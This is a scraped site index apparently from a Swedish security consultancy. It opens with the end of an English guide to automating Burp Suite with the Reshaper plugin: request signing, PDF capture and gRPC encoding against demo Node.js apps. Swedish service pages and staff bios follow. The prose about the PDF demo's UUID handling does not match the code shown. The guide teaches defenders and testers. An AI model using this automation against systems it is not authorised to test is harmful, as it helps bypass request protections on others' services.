Base64._utf8_encode(input); while (i \u0026lt; input.length) { chr1 = input.charCodeAt(i++); chr2 = input.charCodeAt(i++); chr3 = input.charCodeAt(i++); enc1 = chr1 \u0026gt;\u0026gt; 2; enc2 = ((chr1 \u0026amp; 3) \u0026lt;\u0026lt; 4) | (chr2 \u0026gt;\u0026gt; 4); enc3 = ((chr2 \u0026amp; 15) \u0026lt;\u0026lt; 2) | (chr3 \u0026gt;\u0026gt; 6); enc4 = chr3 \u0026amp; 63; if (isNaN(chr2)) { enc3 = enc4 = 64; } else if (isNaN(chr3)) { enc4 = 64; } output = output + this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) + this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4); } return output; }, // public method for decoding decode : function (input) { var output = \u0026#34;\u0026#34;; var chr1, chr2, chr3; var enc1, enc2, enc3, enc4; var i = 0; input = input.replace(/[^A-Za-z0-9\\+\\/\\=]/g, \u0026#34;\u0026#34;); while (i \u0026lt; input.length) { enc1 = this._keyStr.indexOf(input.charAt(i++)); enc2 = this._keyStr.indexOf(input.charAt(i++)); enc3 = this._keyStr.indexOf(input.charAt(i++)); enc4 = this._keyStr.indexOf(input.charAt(i++)); chr1 = (enc1 \u0026lt;\u0026lt; 2) | (enc2 \u0026gt;\u0026gt; 4); chr2 = ((enc2 \u0026amp; 15) \u0026lt;\u0026lt; 4) | (enc3 \u0026gt;\u0026gt; 2); chr3 = ((enc3 \u0026amp; 3) \u0026lt;\u0026lt; 6) | enc4; output = output + String.fromCharCode(chr1); if (enc3 != 64) { output = output + String.fromCharCode(chr2); } if (enc4 != 64) { output = output + String.fromCharCode(chr3); } } output = Base64._utf8_decode(output); return output; }, // private method for UTF-8 encoding _utf8_encode : function (string) { string = string.replace(/\\r\\n/g,\u0026#34;\\n\u0026#34;); var utftext = \u0026#34;\u0026#34;; for (var n = 0; n \u0026lt; string.length; n++) { var c = string.charCodeAt(n); if (c \u0026lt; 128) { utftext += String.fromCharCode(c); } else if((c \u0026gt; 127) \u0026amp;\u0026amp; (c \u0026lt; 2048)) { utftext += String.fromCharCode((c \u0026gt;\u0026gt; 6) | 192); utftext += String.fromCharCode((c \u0026amp; 63) | 128); } else { utftext += String.fromCharCode((c \u0026gt;\u0026gt; 12) | 224); utftext += String.fromCharCode(((c \u0026gt;\u0026gt; 6) \u0026amp; 63) | 128); utftext += String.fromCharCode((c \u0026amp; 63) | 128); } } return utftext; }, // private method for UTF-8 decoding _utf8_decode : function (utftext) { var string = \u0026#34;\u0026#34;; var i = 0; var c = c1 = c2 = 0; while ( i \u0026lt; utftext.length ) { c = utftext.charCodeAt(i); if (c \u0026lt; 128) { string += String.fromCharCode(c); i++; } else if((c \u0026gt; 191) \u0026amp;\u0026amp; (c \u0026lt; 224)) { c2 = utftext.charCodeAt(i+1); string += String.fromCharCode(((c \u0026amp; 31) \u0026lt;\u0026lt; 6) | (c2 \u0026amp; 63)); i += 2; } else { c2 = utftext.charCodeAt(i+1); c3 = utftext.charCodeAt(i+2); string += String.fromCharCode(((c \u0026amp; 15) \u0026lt;\u0026lt; 12) | ((c2 \u0026amp; 63) \u0026lt;\u0026lt; 6) | (c3 \u0026amp; 63)); i += 3; } } return string; } } var snus = Base64.encode(Reshaper.variables.getGlobalVariable(\u0026#34;name_input\u0026#34;)); Reshaper.event.runThen(\u0026#34;SetVariable\u0026#34;, { text: snus, useMessageValue: false, targetSource: \u0026#34;Global\u0026#34;, variableName: \u0026#34;name_input_base64\u0026#34; } ); The reason for base64 encoding our data before sending it to a console is because many Burp payloads may include single our double quotes which can escape our terminal command and we end up command injecting ourselves instead of the server.\nNext we use Run Process to drop our name_input_base64 variable to our python3 tool called signer.py.\nRequest Direction Thens Command Stdin Wait for completion Capture Output Capture Variable Name N/A Run Process python3 /home/user/tricky-apis/node-api-sign/signer.py {{g:name_input_base64}} Checked Checked signature If everything is followed correctly 3 variables will be created in the Global Variables tab:\nNext up we will use the Set value action the replace our form-urlencode parameters:\nRequest Direction Thens Source Text Source Type Value Destination Message Value Destination Value Type Destination Identifier Placement Destination Value Path N/A Set Value {{g:name_input}} Text Request Body Params N/A name N/A Set Value {{g:signature}} Text Request Body Params N/A signature Very nice. However, when we test run our setup everything works correctly with repeater but never with intruder. Don\u0026rsquo;t forget to activate Intruder at Capture Traffic From under settings:\nAlso remember to set the maximum concurrent requests in the Intruder resource pool to 1. The setup we have created is quite CPU intensive and will not handle concurrency.\nBut on the other hand - it\u0026rsquo;s automagic :)\nScenario 6 - Using Burp and Reshaper to perform multiple request and save PDF to disk Who doesn\u0026rsquo;t love a good PDF generator? We at Shelltrail certainly do. However sometimes multiple steps is needed to provide the content that later will be used in the generated PDF.\nTo simulate this we run the following node.js application:\n// mkdir $HOME/node-api-pdf // cd $HOME/node-api-pdf // npm init -y // npm install express body-parser puppeteer const express = require(\u0026#39;express\u0026#39;); const bodyParser = require(\u0026#39;body-parser\u0026#39;); const puppeteer = require(\u0026#39;puppeteer\u0026#39;); const app = express(); const port = 3000; // In-memory storage for HTML let storedHTML = \u0026#39;\u0026#39;; // Middleware to check API key const apiKeyMiddleware = (req, res, next) =\u0026gt; { const apiKey = req.headers[\u0026#39;api-key\u0026#39;]; if (apiKey !== \u0026#39;1d8e71ab-8e46-47aa-b25c-a3c8c83b0360\u0026#39;) { return res.status(403).json({ message: \u0026#39;Forbidden: Incorrect API key\u0026#39; }); } next(); }; app.use(bodyParser.text({ type: \u0026#39;text/html\u0026#39; })); // Insert endpoint app.post(\u0026#39;/insert\u0026#39;, apiKeyMiddleware, (req, res) =\u0026gt; { storedHTML = req.body; // Store HTML content in memory res.status(200).json({ message: \u0026#39;HTML content stored successfully\u0026#39; }); }); // Generate endpoint app.get(\u0026#39;/generate\u0026#39;, apiKeyMiddleware, async (req, res) =\u0026gt; { if (!storedHTML) { return res.status(404).json({ message: \u0026#39;No HTML content found to generate PDF\u0026#39; }); } const browser = await puppeteer.launch(); const page = await browser.newPage(); await page.setContent(storedHTML, { waitUntil: \u0026#39;networkidle0\u0026#39; }); const pdfBuffer = await page.pdf({ format: \u0026#39;A4\u0026#39; }); await browser.close(); res.contentType(\u0026#39;application/pdf\u0026#39;); res.send(pdfBuffer); }); app.listen(port, () =\u0026gt; { console.log(`Server running on http://localhost:${port}`); }); The application has two endpoints, /insert and /generate. The /insert takes user supplied input via a POST body and stores in memory and returns a UUID representing the content. The input should be in HTML. Upon performing a GET request to /generate/\u0026lt;UUID\u0026gt; the HTML content will be converted to a PDF. Both endpoint requires an API key.\nStoring the HTML content:\n$ curl -X POST http://localhost:3000/insert \\ -H \u0026#39;Content-Type: text/html\u0026#39; \\ -H \u0026#39;API-Key: 1d8e71ab-8e46-47aa-b25c-a3c8c83b0360\u0026#39; \\ -d \u0026#39;\u0026lt;html\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;Hello, World!\u0026lt;/h1\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#39; {\u0026#34;uuid\u0026#34;:\u0026#34;5d164279-4515-4db6-b620-976c2b56431d\u0026#34;} Generating the PDF:\n$ curl http://localhost:3000/generate/5d164279-4515-4db6-b620-976c2b56431d -H \u0026#39;API-Key: 1d8e71ab-8e46-47aa-b25c-a3c8c83b0360\u0026#39; -o output.pdf % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 14408 100 14408 0 0 9232 0 0:00:01 0:00:01 --:--:-- 9229 $ file output.pdf output.pdf: PDF document, version 1.4, 1 page(s) Great success. Everything seems to work as expected.\nLets plan our setup:\nSet the API key named api_key as variable in Reshaper Create a Whens action to trigger on POST to /input Store the UUID in a variable named uuid returned from the /input action. Build a HTTP GET request which uses the UUID variable and API key to generate the PDF Send the crafted HTTP request Save the generate PDF to disk Task 1 - Set the API key named api_key as variable in Reshaper:\nTask 2 - Create a Whens action to trigger on POST to /input:\nRequest Direction Whens Source Message Value Source Value Type Match Type Match Text Response Matches Text Request Status Line Text Equals POST /insert HTTP/1.1 (Note: The Request direction shall be Response even though our POST action is a Request.)\nTask 3 - Store the returned UUID in a variable named uuid from the /input endpoint:\nRequest Direction Thens Source Message Value Source Value Type Source Value Path Destination Variable Source Destination Variable Name Destination Value Type N/A Set Variable Response Body JSON uuid Global uuid Text Task 4 - Build a HTTP GET request which uses the UUID variable and API key to generate the PDF:\nNow we need to use a new action type called Build HTTP Message.\nRequest Direction Thens Event Direction Starter HTTP message Setter (1) - Source Text Destination Message Value Destination Identifier Placement Setter (2) Source Text Destination Message Value Destination Identifier Destination Identifier Placement Destination Variable Source Destination Variable Name N/A Build HTTP Message Request GET /generate/{{g:uuid}} HTTP/1.1 {{g:api_key}} Request Header API-Key Only localhost:3000 Request Header Host Only Global http_message Now this is really cool. If we trigger this Reshaper rule by sending a POST request to /insert to get an UUID response, Reshaper crafts a fully functional HTTP request and store in a variable called http_message:\nTask 5 - Send the crafted HTTP request:\nRequest Direction Thens Request URL Protocol Address Port Wait for Completion N/A Send Request {{g:http_message}} Checked Task 6 - Save the generate PDF to disk:\nWe store every PDF on disk because we want to manually inspect them to not miss any potential vulnerabilities.\nTo achieve this We create a new Reshaper HTTP rule that will match on the HTTP response header Content-Type: application/pdf:\nRequest Direction Whens Source Message Value Source Identifier Identifies Placement Source Value Type Match Type Match Text Response Matches Text Response Header Content-Type Last Text Equals application-pdf We set the response body (a.k.a the PDF file) to a variable named pdf\nRequest Direction Thens Source Message Value Source Value Type Destination Variable Source Destination Variable Name Destination Value Type N/A Set Variable Response Body Text Global pdf Text And then save that variable to disk at the location /tmp/pdf/\u0026lt;UUID\u0026gt;.pdf:\nRequest Direction Thens File Path Text Encoding File Exist Action N/A Save File /tmp/pdf/{{g:uuid}}.pdf {{g:pdf}} Default Overwrite From now on every request that is sent to /insert will save a PDF to the /tmp/pdf location where inspection of content can be made.\n$ file /tmp/pdf/* /tmp/pdf/05b053d5-e232-449f-b2d2-0c4338d8a2f6.pdf: PDF document, version 1.4, 1 page(s) /tmp/pdf/3e674c45-369e-4b04-8409-f90539a50eb3.pdf: PDF document, version 1.4, 1 page(s) /tmp/pdf/7fb8bbc0-91fd-4141-ba2a-090419364e5d.pdf: PDF document, version 1.4, 1 page(s) /tmp/pdf/812b488a-ecc1-4e8d-b8ef-b2dd105c181a.pdf: PDF document, version 1.4, 1 page(s) /tmp/pdf/88ce6b32-26ca-46f8-ad43-e77a8f679098.pdf: PDF document, version 1.4, 1 page(s) /tmp/pdf/c5c94988-d980-49d4-ba48-1d20ed5e877c.pdf: PDF document, version 1.4, 1 page(s) /tmp/pdf/ec410dc7-6937-45bb-ba58-37ab85566297.pdf: PDF document, version 1.4, 1 page(s) /tmp/pdf/f9c0101f-c510-49d6-be47-da2fb382206b.pdf: PDF document, version 1.4, 1 page(s) Scenario 7 - gRPC from the abyss gRPC is a tricky protocol which makes automatic scanning and testing hard as it is using protobuf and serializes its messages. @nxenon has performed in-depth research and provides tooling for encoding and decoding these protobuf messages.\nWe\u0026rsquo;ll build on top of that research and implement an automatic encoder that can be used with Burps active scanner and repeater.\nUse nxenon\u0026rsquo;s echo gRPC lab to spin up an demo environment which will be used to demonstrate Reshapers abilities.\nWhen the environment is live requests and responses will look like this:\nLets configure our Reshaper HTTP rules as following:\nRequest Direction Whens Source Message Value Source Value Type Match Type Match Text Response Matches Text URL Text Equals http://localhost:8080/grpc.gateway.testing.EchoService/Echo We\u0026rsquo;ll set the request body to a variable:\nRequest Direction Thens Source Message Value Source Value Type Destination Variable Source Destination Variable Name Destination Value Type N/A Set Variable Request Body Text Global grpc Text We once again use our base64 encoder technique to encode our data before dropping it to our command-line tooling.\nRun Script:\nvar Base64 = { // private property _keyStr : \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\u0026#34;, // public method for encoding encode : function (input) { var output = \u0026#34;\u0026#34;; var chr1, chr2, chr3, enc1, enc2, enc3, enc4; var i = 0; input = Base64._utf8_encode(input); while (i \u0026lt; input.length) { chr1 = input.charCodeAt(i++); chr2 = input.charCodeAt(i++); chr3 = input.charCodeAt(i++); enc1 = chr1 \u0026gt;\u0026gt; 2; enc2 = ((chr1 \u0026amp; 3) \u0026lt;\u0026lt; 4) | (chr2 \u0026gt;\u0026gt; 4); enc3 = ((chr2 \u0026amp; 15) \u0026lt;\u0026lt; 2) | (chr3 \u0026gt;\u0026gt; 6); enc4 = chr3 \u0026amp; 63; if (isNaN(chr2)) { enc3 = enc4 = 64; } else if (isNaN(chr3)) { enc4 = 64; } output = output + this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) + this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4); } return output; }, // public method for decoding decode : function (input) { var output = \u0026#34;\u0026#34;; var chr1, chr2, chr3; var enc1, enc2, enc3, enc4; var i = 0; input = input.replace(/[^A-Za-z0-9\\+\\/\\=]/g, \u0026#34;\u0026#34;); while (i \u0026lt; input.length) { enc1 = this._keyStr.indexOf(input.charAt(i++)); enc2 = this._keyStr.indexOf(input.charAt(i++)); enc3 = this._keyStr.indexOf(input.charAt(i++)); enc4 = this._keyStr.indexOf(input.charAt(i++)); chr1 = (enc1 \u0026lt;\u0026lt; 2) | (enc2 \u0026gt;\u0026gt; 4); chr2 = ((enc2 \u0026amp; 15) \u0026lt;\u0026lt; 4) | (enc3 \u0026gt;\u0026gt; 2); chr3 = ((enc3 \u0026amp; 3) \u0026lt;\u0026lt; 6) | enc4; output = output + String.fromCharCode(chr1); if (enc3 != 64) { output = output + String.fromCharCode(chr2); } if (enc4 != 64) { output = output + String.fromCharCode(chr3); } } output = Base64._utf8_decode(output); return output; }, // private method for UTF-8 encoding _utf8_encode : function (string) { string = string.replace(/\\r\\n/g,\u0026#34;\\n\u0026#34;); var utftext = \u0026#34;\u0026#34;; for (var n = 0; n \u0026lt; string.length; n++) { var c = string.charCodeAt(n); if (c \u0026lt; 128) { utftext += String.fromCharCode(c); } else if((c \u0026gt; 127) \u0026amp;\u0026amp; (c \u0026lt; 2048)) { utftext += String.fromCharCode((c \u0026gt;\u0026gt; 6) | 192); utftext += String.fromCharCode((c \u0026amp; 63) | 128); } else { utftext += String.fromCharCode((c \u0026gt;\u0026gt; 12) | 224); utftext += String.fromCharCode(((c \u0026gt;\u0026gt; 6) \u0026amp; 63) | 128); utftext += String.fromCharCode((c \u0026amp; 63) | 128); } } return utftext; }, // private method for UTF-8 decoding _utf8_decode : function (utftext) { var string = \u0026#34;\u0026#34;; var i = 0; var c = c1 = c2 = 0; while ( i \u0026lt; utftext.length ) { c = utftext.charCodeAt(i); if (c \u0026lt; 128) { string += String.fromCharCode(c); i++; } else if((c \u0026gt; 191) \u0026amp;\u0026amp; (c \u0026lt; 224)) { c2 = utftext.charCodeAt(i+1); string += String.fromCharCode(((c \u0026amp; 31) \u0026lt;\u0026lt; 6) | (c2 \u0026amp; 63)); i += 2; } else { c2 = utftext.charCodeAt(i+1); c3 = utftext.charCodeAt(i+2); string += String.fromCharCode(((c \u0026amp; 15) \u0026lt;\u0026lt; 12) | ((c2 \u0026amp; 63) \u0026lt;\u0026lt; 6) | (c3 \u0026amp; 63)); i += 3; } } return string; } } var snus = Base64.encode(Reshaper.variables.getGlobalVariable(\u0026#34;grpc\u0026#34;)); Reshaper.event.runThen(\u0026#34;SetVariable\u0026#34;, { text: snus, useMessageValue: false, targetSource: \u0026#34;Global\u0026#34;, variableName: \u0026#34;grpc_base64\u0026#34; } ); Now we send our payload stored in the grpc_base64 variable to nxenon\u0026rsquo;s grpc-coder.py tool:\nRequest Direction Thens Command Stdin Wait for completion Capture Output Capture Variable Name N/A Run Process echo $(echo {{g:grpc_base64}} | base64 -d) | protoscope -s | python3 /home/user/grpc-coder.py \u0026ndash;encode | tr -d \u0026lsquo;\\n\u0026rsquo; Checked Checked grpc_payload Next we replace our request body with the gRPC encoded payload:\nRequest Direction Thens Source Text Source Type Value Destination Message Value Destination Value Type N/A Set Value {{g:grpc_payload}} Text Request Body Text Awesome. Now we can grab a valid request that has been sent to the server, use the grpc-coder.py to decode the input, then we can use Burps active scanner or manually customize the input as we please and all encoding will be done automatically.\nThis will save us precious time when assessing gRPC Web applications.\nSummary Reshaper is an extremely powerful Burp plugin that helps you automate complex flows or overcome hurdles when assessing advanced web applications. It\u0026rsquo;s been a long way to reach the end of this research but if you are here you most certainly learned a thing or two regarding the many possibilities with Burp and Reshaper which may help you when pentesting web applications.\nAll the code from all node.js applications can be found at Shelltrails github page,\nTake care and happy hacking!\n","date":1713744000,"expirydate":-62135596800,"kind":"page","lang":"sv","lastmod":1713744000,"objectID":"cbb5a133083d9a5a01ee979b026cea95","permalink":"https://www.shelltrail.com/sv/research/reshaper-the-guide-to-ultimate-burp-plugin-for-advanced-shenanigans/","publishdate":"2024-04-22T00:00:00Z","relpermalink":"/sv/research/reshaper-the-guide-to-ultimate-burp-plugin-for-advanced-shenanigans/","section":"research","summary":"Have you ever had issues with CSRF tokens during a web assessment? Or drop data from burp to commandline for parsing? This is the guide to leverage the power of the Reshaper plugin developed by @ddwightx","tags":null,"title":"Reshaper - The guide to the ultimate Burp plugin for advanced shenanigans","type":"research"},{"authors":null,"categories":null,"content":"Flera års infrastrukturadministration har omvandlats till färdigheter inom penetrationstestning. Besitter en bred bakgrund av att arbeta med olika branscher i huvudsakligen säkerhetsorienterade aspekter.\nCertifieringar:\nOffensive Security Certified Expert 3 (OSCE3) Offensive Security Experienced Penetration Tester (OSEP) Offensive Security Web Expert (OSWE) Offensive Security Exploit Developer (OSED) Offensive Security Certified Professional (OSCP) Certified Kubernetes Security Specialist (CKS) Certified Kubernetes Administrator (CKA) Certified Az Red Team Professional (CARTP) Microsoft Certified: Azure Security Engineer Associate (AZ-500) AWS Certified Security Specialty Microsoft Certified: Azure Fundamentals (AZ-900) ","date":1699488000,"expirydate":-62135596800,"kind":"page","lang":"sv","lastmod":1716336000,"objectID":"ffabd1015e7c9fc52f4904f0a5fe217d","permalink":"https://www.shelltrail.com/sv/medarbetare/andreas/","publishdate":"2023-11-09T00:00:00Z","relpermalink":"/sv/medarbetare/andreas/","section":"medarbetare","summary":"IT-Säkerhetskonsult","tags":null,"title":"Andreas Vikerup","type":"medarbetare"},{"authors":null,"categories":null,"content":"CERT-SE är Sveriges nationella Computer Emergency Response Team med uppgift att stötta samhället i arbetet med att hantera och förebygga IT-incidenter. Exempel på CERT-SE\u0026rsquo;s uppgifter är bland annat att öka säkerhetsmedvetenheten genom att förmedla kunskap och fakta gällande sårbarheter i IT system eller att hjälpa till att hantera IT-incidenter genom att vara en central punkt för hantering av information gällande pågående attacker.\nCERT-SE är en del av Myndigheten för Samhällsskydd och Beredskap (MSB) som via stöd från regeringen har i uppdrag att förebygga och hantera eventuella dessa IT-incidenter för både privata företag och offentlig sektor.\nSom ett led i att förebygga IT-incidenter tillhandahåller CERT-SE tjänsten Automatiska Notifieringar avseende Tekniska Sårbarheter (ANTS). Detta är en tjänst där företag, organisationer eller offentlig sektor kan kan rapportera in sina internet-exponerade system och via CERT-SE bli notifierade om systemen tros ha blivit kapade, har en sårbar konfiguration eller om det påträffats en publikt känd sårbarhet.\nAtt anmäla sig till ANTS är ett komplement i sitt säkerhetsarbete och kan ej ses som en ersättning till exempelvis en extern säkerhetsgranskning där manuell granskning av systemen utförs.\nSummering ANTS är en konstnadsfri tjänst som underlättar möjligheten för CERT-SE att kontakta dig om det skulle uppdagas att något av de system du anmält till tjänsten kan vara hotade. Med det sagt finns det få anledningar till att inte anmäla sig - mer information finns på https://www.cert.se/utskick-faq/\n","date":1699488000,"expirydate":-62135596800,"kind":"page","lang":"sv","lastmod":1699488000,"objectID":"f12024256d8b15a3537c0d46fba0e3d5","permalink":"https://www.shelltrail.com/sv/blogg/cert-se-automatiska-notifieringar-avseende-tekniska-sarbarheter/","publishdate":"2023-11-09T00:00:00Z","relpermalink":"/sv/blogg/cert-se-automatiska-notifieringar-avseende-tekniska-sarbarheter/","section":"blogg","summary":"Läs om hur CERT-SE (en del av MSB) kan hjälpa till att uppmärksamma säkerhetsbrister.","tags":["CERT-SE","ANTS","MSB","Samhällsnytta"],"title":"CERT-SE och Automatiska Notifieringar avseende Tekniska Sårbarheter (ANTS)","type":"blogg"},{"authors":null,"categories":null,"content":"En erfaren IT-Säkerhetskonsult med en påvisad historik av arbete inom dator- och nätverkssäkerhetsbranschen. Dan har en passion för att hitta sårbarheter och lära sig nya färdigheter.\nCertifieringar:\nOffensive Security Certified Expert 3 (OSCE3) Offensive Security Experienced Penetration Tester (OSEP) Offensive Security Web Expert (OSWE) Offensive Security Exploit Developer (OSED) Offensive Security Certified Professional (OSCP) Utbildning:\nM.Sc. i Mikroelektronik (Civilingenjör) ","date":1699488000,"expirydate":-62135596800,"kind":"page","lang":"sv","lastmod":1699488000,"objectID":"f1e26228a9495b2d8a6b5499fe59ca25","permalink":"https://www.shelltrail.com/sv/medarbetare/dan/","publishdate":"2023-11-09T00:00:00Z","relpermalink":"/sv/medarbetare/dan/","section":"medarbetare","summary":"IT-Säkerhetskonsult","tags":null,"title":"Dan Rosenqvist","type":"medarbetare"},{"authors":null,"categories":null,"content":"När utförde ert företag senast en inventering och granskning av alla internetexponerade system? Det är en bra fråga att söka svar på när man vill riskbedöma sin internetnärvaro. System föråldras och nya sårbarheter upptäcks dagligen vilket innebär att företag måste vara noggranna med att inventera sina system, vilka portar exponeras, vilka versioner som körs av olika programvaror och mappa dessa mot sårbarheter som innebär en verklig risk.\nDet är en svår uppgift som måste itereras med jämna mellanrum och är inte alltid i förening med företagets prioriterade mål. En vanlig anledning är att systemen verkar fungera och att det finns en attityd att inte påverka något som fungererar.\nVad innebär ett pentest av extern infrastruktur? Oftast så inleds uppdraget genom att beställaren överlämnar en lista på IP-adresser och domännamn som skall granskas. Utöver detta så använder Shelltrail Open Source Intelligence-källor (OSINT) för att försöka hitta fler system som kan vara odokumenterade och eller klassas som Skugg-IT.\nNär listan över system som är identifierade anses vara komplett, verifieras det att alla mål är under beställarens säkerhetsansvar och inte tredje-partssystem. Om så är fallet måste skriftligt godkännande gällande säkerhetsgranskning av tredje-part överlämnas till Shelltrail\u0026rsquo;s säkerhetskonsulter.\nMed en komplett lista av legitima mål påbörjas testandet där en kombination av automatiskta och manuell granskning av systemen genomförs. Här kombineras tekniker från alla Shelltrail\u0026rsquo;s expertområden såsom säkerhetgranskning av webbapplikation, Windows och Linux angrepp, binär exploatering och molnspecifika attacker för att nämna några.\nShelltrail\u0026rsquo;s säkerhetsexperter besitter en bred bakgrund inom cybersäkerhetsgranskningar vilket ämnar sig bra till de varierade tjänsterna som kan exponeras på internet.\nVarför och när ska man göra en extern infrastruktur granskning? Som tidigare nämnts så upptäckts nya sårbarheter dagligen och system blir udaterade vilket gör att tillverkaren ibland slutar underhålla system med säkerhetsuppdateringar. Detta gör det viktigt att man med jämna mellanrum utföra en granskning av sina internetexponerade system för att kunna säkra upp dessa innan angripare hittar systemet. Oavsett om ert företag producerar knappnålar eller utvecklar läkemedel så kan era internet exponerade system bli mål för en opportunistisk angripare som skannar internet.\nResultatet Uppdraget resulterar i en professionell rapport där alla brister beskrivs i ett detaljerat format. Sårbarheterna beskrivna i rapporten rankas från kritisk till låg och i kombination med beställarens uppfattade hotbild kan rapporten användas som en prioriteringslista på vilken ordning man ska åtgärda problemen. Det är inte ovanlig att rapporten används för att skapa en ökad budget för företagets säkerhetsarbete eller upplysa exempelvis ledning att säkerhet måste prioriteras.\n","date":1699488000,"expirydate":-62135596800,"kind":"page","lang":"sv","lastmod":1699488000,"objectID":"c9f70a668d605881f434c68ec1042f91","permalink":"https://www.shelltrail.com/sv/cybersakerhetstjanster/extern-infrastruktur/","publishdate":"2023-11-09T00:00:00Z","relpermalink":"/sv/cybersakerhetstjanster/extern-infrastruktur/","section":"cybersakerhetstjanster","summary":"En extern säkerhetsgranskning av infrastruktur innebär att analysera en organisations nätverk, system och online-närvaro ur ett externt perspektiv för att identifiera och minska sårbarheter som kan utnyttjas av externa angripare.","tags":["Extern nätverks penetrationstest"],"title":"Extern infrastruktur","type":"cybersakerhetstjanster"},{"authors":null,"categories":null,"content":"Ett pentest eller penetrationstest är en säkerhetsgranskning av ett system som syftar till att identifiera sårbarheter i systemet som sedan kan åtgärdas för att se till att de inte kan utnyttjas av en angripare. Det finns ett flertal olika typer av pentest, som skiljer sig något i förutsättningar och utförande:\nPentest av interna nätverk och Active Directory Pentest av webbapplikationer Pentest av mobilapplikationer Pentest av molnmiljöer Vi har i denna artikel valt att beskriva de delar som dessa olika typer av pentest har gemensamt, vilket är de olika faserna testerna går igenom under de 1-2 veckor som pentestet pågår. Här skiljer sig dessa något mellan olika leverantörer, men vi har valt att beskriva dem i grova drag.\nScoping Den första fasen är vanligtvis det som kallas scoping, där innehållet i testet definieras. Här går man igenom saker som vilka system som skall testas, när i tiden, vilka risker uppdragsgivaren ser, i vilken miljö testet genomförs (exempelvis i utvecklings- eller produktionsmiljö) samt om det finns undantag till vad som får testas. Scopingen är viktig då denna sätter omfattningen på testet.\nDet är värt att notera att den här fasen typiskt sett utförs en tid innan testet då det ofta uppkommer frågor och begränsningar som behöver lösas innan ett test väl kan påbörjas.\nUppstart Nästa, vanligtvis korta fas, är uppstarten på testet. Här valideras att alla förutsättningar är på plats, att testarna har tillgång till miljön samt ges möjlighet att se hur applikationen används till vardags. Under detta, typiskt 1 timme långa möte finns det ofta möljighet att reda ut kvarvarande frågor från kundens sida samt möjlighet för testarna att ställa ytterligare frågor.\nSom en del i den här fasen ingår även de förberedelser testarna behöver utföra för att på ett säkert sätt kunna genomföra uppdraget. Det innefattar bland annat att sätta upp en säker isolerad miljö för testning, införskaffande av utrustning som kan behövas och att läsa på om kundens verksamhet.\nTestfasen Så snart uppstartsmötet är avslutat är testarna i regel redo att påbörja testet där de etiska hackarna använder samma verktyg och metoder som riktiga angripare. Vanligtvis behövs lite eller ingen vägledning under denna fas, även om det är bra att ha en teknisk kontaktperson hos kunden för att reda ut problem som kan uppstå. Även om det inte är vanligt att de testade miljöerna helt slutar fungera, så kan de anrop som används utav testarna få applikationen att bete sig på ett sätt som inte var menat.\nÄven om de flesta brister inte rapporteras löpande under testets gång så är det vanligt att kritiska sårbarheter rapporteras så snart de identifierats, då dessa kan leda till allvarliga konsekvenser i produktionsssystem.\nAvrapporteringsmöte och Rapport När tiden för testet löper mot sitt slut så sammanställer testarna de säkerhetsbrister som identifierats i en utförlig rapport samt presenterar bristerna på ett avrapporteringsmöte.\nRapporten, som är tilltänkt att läsas av personer med olika ansvar och bakgrund, innehåller vanligtvis en högnivåbeskrivning av testet och resultatet samt en mer detaljerad teknisk del där bristerna, hur de nyttjas och åtgärdas beskrivs.\nAvrapporteringsmötet syftar till att testarna skall kunna visa de identifierade bristerna, hur de går att utnyttja samt hur de kan åtgärdas eller motverkas. Här har även kunden möjlighet att ställa frågor som ofta kan uppkomma då vissa attacker innefattar komplexa flöden.\nSummering Vi på Shelltrail är vana att hjälpa företag att säkra upp sina system genom att uföra säkerhetsgranskningar. Använd vårt kontaktformulär eller skicka ett mail till info@shelltrail.com så kan vi diskutera vilka sätt vi kan hjälpa er.\n","date":1699488000,"expirydate":-62135596800,"kind":"page","lang":"sv","lastmod":1699488000,"objectID":"37ed4a40d6b435f8d0a4e34cc0f42905","permalink":"https://www.shelltrail.com/sv/blogg/hur-gar-ett-pentest-till/","publishdate":"2023-11-09T00:00:00Z","relpermalink":"/sv/blogg/hur-gar-ett-pentest-till/","section":"blogg","summary":"I denna artikel kommer vi gå igenom hur ett penetrationstest/pentest går till genom att gå igenom de olika stegen i ett pentest.","tags":["Pentest","Penetrationstest","Säkerhetsgranskning"],"title":"Hur går ett pentest till?","type":"blogg"},{"authors":null,"categories":null,"content":"En säkerhetgranskning av interna nätverk, som vanligtvis kombineras med en granskning av ett företags Active Directory-miljö är ett vanligt sätt att utvärdera ett företags djupa motståndskraft mot angripare. En vanlig missuppfattning är att det externa skyddet är tillräckligt för att effektivt stoppa angripare, men detta är sällan fallet då lösenords gissning, phishing, nyttjande av noll-dags sårbarheter eller social engineering är attackytor som alltid är tillgängliga för angripare.\nVad är innebär ett pentest av interna nätverk? Ett pentest av de interna systemen genomförs vanligtvis i ett så kallat \u0026ldquo;Assume Breach\u0026rdquo;-scenario, som simulerar att en intern resurs (exempelvis en klientdator) har blivit komprometterad av en angripare. Ett test tar ca 2 veckor att genomföra i en medelstor miljö, även om detta kan variera baserat på upplägget av testet. Ifrån denna utgångspunkt granskar Shelltrails säkerhetsexperter de system (inklusive Active Directory-miljön) för att se hur en angripare skulle kunna ta över angränsande system och eskalera sina behörigheter i miljön för att nå mål definierade av kunden.\nGranskningen består av många delar och system, som exempelvis:\nInterna webbapplikationer Behörighetsstrukturer (ACL) Konfigurationsservrar (SCCM/MECM/ConfigMgr) Certifikatssystem (AD CS) SQL-servrar Varför och när bör vi göra ett internt pentest? Målsättningen med ett internt pentest är att öka motståndskraften i era interna nätverk, genom att identifiera sårbarheter och därigenom begränsa möjligheterna för angripare att överta ytterligare system eller tillskansa sig högre behörigheter.\nVi rekommenderar alla företag med större interna miljöer att genomföra säkerhetsgranskningar av sina interna miljöer åt minstone på en årlig basis, då nya attacker ständigt uppdagas.\nResultat En säkerhetsgranskning avslutas med ett avrapporteringsmöte och en rapport som detaljerat går igenom identifierade brister och hur dessa kan åtgärdas, samt övergripande rekommendationer om hur säkerhetsnivån i er interna miljö kan 